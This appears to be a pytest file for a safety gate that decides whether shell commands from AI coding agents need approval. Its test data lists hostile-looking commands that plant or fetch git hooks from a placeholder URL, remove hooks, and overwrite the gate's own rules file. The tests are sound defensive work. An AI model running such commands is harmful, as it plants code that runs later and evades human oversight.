"""D96, follow-up note 39 (F35-1): a program the gate does not model writes what its words name.

The order: a Bash command that writes into the hook folder (`cp`, `mv`, `tee`, `install`, `ln`, a redirection) carries
the weight of _D72_WRITES. Found in PLUGIN_N35 (F35-1): `cp <file> <repo>/.git/hooks/pre-commit` got no answer at
9e0d071b and at f9e5f18e; only a file tool (Write, Edit) asked there.

Measured with GNU coreutils 9.4 and curl under strace -f (truth_path_words_n39.py, 35 forms): cp, mv, install, ln, dd,
touch, truncate, rm, chmod, mkdir, curl -o, tar -cf and patch -o each create, change, remove or re-mode the path one of
their words names or a file in that folder, in every spelling (`-t DIR`, `-tDIR`, `--t=DIR`, `of=OUT`, `-oOUT`); cat and
ls change nothing.

The rule: for a step of a program the gate does not model (other) and for a carrier, every path its words name is judged
as a file-tool write (decide_write): each word bash makes into a path the gate can name (a literal word, `~/x`,
`$HOME/x`, a glob in its last component), each value after `=` and each rest of a short option bundle. A write into
the configuration or the hooks asks (write_to_repo_state), one into the gate's directory is denied (write_to_gate_dir),
and the line gives the write its weight (D72). The writes are judged before class c decides to keep the whole command's
answer, and a kept answer carries them. A data step keeps its own reading (D95), a git or gh step its own rules.

RED at f9e5f18e (the head of PLUGIN_N35): every write of such a program into the configuration, the hooks or the gate's
directory. The counter cases (other folders, reads of data programs, a directory unknown after `cd`) are green at both.
"""
from __future__ import annotations

import os
import time

import pytest

import test_plugin_n30_short_line_d72 as d72

gate = d72.gate
pytestmark = d72.pytestmark
_clean = d72._clean
HOSTS = ("claude", "codex")


@pytest.fixture
def repo(tmp_path):
    r = d72._repo(tmp_path)
    (r / "f.txt").write_text("b\na\n")
    (r / "sub").mkdir()
    return r


def _out(repo, form, host="claude"):
    command = form.replace("{R}", str(repo)).replace("{GATE}", os.environ["PROOFBUNDLE_GATE_DIR"])
    return gate.decide(command, str(repo), time.monotonic() + 60, host)


def _ids(out):
    return [] if out is None else [v.reason_id for v in out.verdicts]


#: Writes of programs the gate does not model into the configuration or the hooks; each got no answer at f9e5f18e.
INTO_REPO_STATE = [
    "cp f.txt .git/hooks/pre-commit", "cp f.txt .git/hooks", "cp -t .git/hooks f.txt", "cp -t.git/hooks f.txt",
    "cp --target-directory=.git/hooks f.txt", "cp --t=.git/hooks f.txt", "cp -- f.txt .git/hooks/pre-push",
    "mv f.txt .git/hooks/pre-push", "mv .git/hooks/pre-push sub/", "install -m 755 f.txt .git/hooks/pre-commit",
    "install -t .git/hooks f.txt", "ln -s ../../f.txt .git/hooks/post-merge", "ln -sf f.txt .git/hooks/pre-push",
    "dd if=f.txt of=.git/config", "touch .git/hooks/post-checkout", "truncate -s 0 .git/config",
    "rm .git/hooks/pre-push", "rm -rf .git/hooks", "chmod -x .git/hooks/pre-push", "chmod +x .git/hooks/*",
    "curl -o.git/hooks/pre-commit https://example.invalid/x", "curl --output .git/hooks/pre-commit https://example.invalid/x",
    "tar -C .git/hooks -xf f.txt", "sudo cp f.txt .git/hooks/pre-commit", "env A=1 install f.txt .git/hooks/x",
    "cp {R}/f.txt {R}/.git/hooks/pre-commit", "cp $SRC .git/hooks/pre-commit",
]


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize("form", INTO_REPO_STATE)
def test_D96_a_program_writes_what_its_words_name_into_configuration_or_hooks(repo, form, host):
    out = _out(repo, form, host)
    assert out is not None and out.decision in ("ask", "deny") and "write_to_repo_state" in _ids(out), \
        (form, host, _ids(out))


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize("form", ["cp f.txt {GATE}/mode", "install -t {GATE} f.txt", "rm {GATE}/rules.json",
                                  "ln -s f.txt {GATE}/language", "touch {GATE}/x"])
def test_D96_a_program_that_writes_into_the_gate_directory_is_denied(repo, form, host):
    out = _out(repo, form, host)
    assert out is not None and out.decision == "deny" and "write_to_gate_dir" in _ids(out), (form, host, _ids(out))


@pytest.mark.parametrize("form", ["cp f.txt .git/hooks/pre-commit && git status",
                                  "install -m 755 f.txt .git/hooks/pre-push; git status",
                                  "git status && ln -s f.txt .git/hooks/post-merge"])
def test_D96_the_write_gives_the_chain_its_reason_and_the_line_its_weight(repo, form):
    out = _out(repo, form)
    assert out.decision == "ask" and "write_to_repo_state" in _ids(out), _ids(out)
    assert " git status because the write can change hooks or git settings that start programs later (D8)." in \
        d72._line(out), d72._line(out)   # D116: what can go wrong, before the D number


@pytest.mark.parametrize("form", ["cp f.txt g.txt", "mv f.txt g.txt", "rm -f g.txt", "mkdir -p build && echo ok",
                                  "touch notes.md", "cp -r sub sub2", "chmod +x f.txt", "ln -s f.txt link",
                                  "ruff check tests/", "python3 scripts/x.py 2>&1 | tail -2", "pytest -q tests/",
                                  "curl -o out.json https://example.invalid/x", "install -d build/bin",
                                  "dd if=f.txt of=copy.txt", "cat .git/config", "grep -n hookspath .git/config",
                                  "ls -la .git/hooks", "wc -l .git/config", "head -3 .git/hooks/pre-commit.sample"])
def test_D96_control_writes_elsewhere_and_reads_of_data_programs_get_no_answer(repo, form):
    assert _out(repo, form) is None, (form, _ids(_out(repo, form)))


def test_D96_control_after_cd_a_relative_path_is_not_judged_as_before(repo):
    """The directory is unknown after `cd` (class e is not built, D33): a relative path there is not judged."""
    out = _out(repo, "cd sub && cp ../f.txt ../.git/hooks/pre-commit")
    assert "write_to_repo_state" not in _ids(out), _ids(out)


def test_D96_an_absolute_path_after_cd_is_judged(repo):
    out = _out(repo, "cd sub && cp ../f.txt {R}/.git/hooks/pre-commit")
    assert out is not None and "write_to_repo_state" in _ids(out), _ids(out)


def test_D96_a_program_that_only_reads_a_hook_is_judged_by_the_path_too(repo):
    """The rule judges every path a word of such a program names; the gate does not know whether it reads or writes
    (an `other` program), so copying a hook out asks as copying one in does. Named in D96 as its cost."""
    out = _out(repo, "cp .git/hooks/pre-commit.sample /tmp/x")
    assert out is not None and "write_to_repo_state" in _ids(out), _ids(out)


@pytest.mark.parametrize("words, expected", [
    (["dd", "if=a", "of=b"], ["if=a", "a", "of=b", "b"]),
    (["cp", "-t.git/hooks", "f"], ["-t.git/hooks", ".git/hooks", "git/hooks", "it/hooks"]),
    (["cp", "--target-directory=x", "f"], ["--target-directory=x", "x", "f"]),
    (["curl", "-o", "out", "https://example.invalid/x"], ["-o", "out"]),
    (["rm", "-", "--", "f"], ["f"]),
])
def test_D96_the_paths_a_step_names(repo, words, expected):
    steps: list = []
    gate._sh_walk(gate._sh_parse(" ".join(words)), str(repo), steps)
    paths = gate._sh_path_words(steps[0], {"HOME": os.environ["HOME"]})
    for p in expected:
        assert p in paths, (words, paths)
    assert not any("://" in p for p in paths), paths


@pytest.mark.parametrize("raw, expected", [("~/x", "{H}/x"), ("~", "{H}"), ('"$HOME/x"', "{H}/x"), ("${HOME}/x", "{H}/x"),
                                           ("$HOME/x", "{H}/x"), ("'~/x'", "~/x"), (".git/hooks/*", ".git/hooks/*"),
                                           ("$X/y", None), ("~/a*/b", None), ("{a,b}", None), ("$(pwd)/x", None)])
def test_D96_the_path_bash_makes_of_a_word(repo, raw, expected):
    steps: list = []
    gate._sh_walk(gate._sh_parse(f"cp f {raw}"), str(repo), steps)
    word = next(s for s in steps if s.head == "cp").cmd.words[2]   # a substitution runs as a step of its own first
    home = {"HOME": os.environ["HOME"]}
    want = None if expected is None else expected.replace("{H}", home["HOME"])
    assert gate._sh_word_path(word, home) == want, (raw, gate._sh_word_path(word, home))
